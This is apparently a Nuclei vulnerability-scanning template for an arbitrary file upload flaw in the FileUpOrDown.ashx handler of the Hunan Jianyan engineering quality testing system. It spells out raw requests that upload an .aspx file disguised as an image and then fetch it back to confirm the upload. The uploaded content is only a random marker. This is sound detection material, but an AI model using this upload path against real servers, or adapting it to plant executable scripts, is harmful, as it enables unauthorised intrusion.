id: hnjazljc-fileupordown-upload

info:
  name: hnjazljc-fileupordown-upload
  author: HB
  severity: critical
  description: 湖南建研工程质量检测系统FileUpOrDown存在任意文件上传漏洞

variables:
  filename: "{{to_lower(rand_base(5))}}"
  suijizifu: "{{to_lower(rand_base(5))}}"

http:
  - raw:
    - |
      GET /Login.cshtml HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      Accept-Encoding: gzip
    - |
      POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName={{filename}}.aspx HTTP/1.1
      Host: {{Hostname}}
      Accept-Encoding: gzip
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP
      Content-Length: 185

      ------WebKitFormBoundarybqACRhAMBHmQQAUP
      Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.aspx"
      Content-Type: image/png

      {{suijizifu}}
      ------WebKitFormBoundarybqACRhAMBHmQQAUP--
    - |
      GET /Excel/Templete/{{filename}}.aspx HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      Accept-Encoding: gzip

    matchers:
      - type: dsl
        dsl:
         - 'status_code==200 && contains_all(body_3,"{{suijizifu}}")'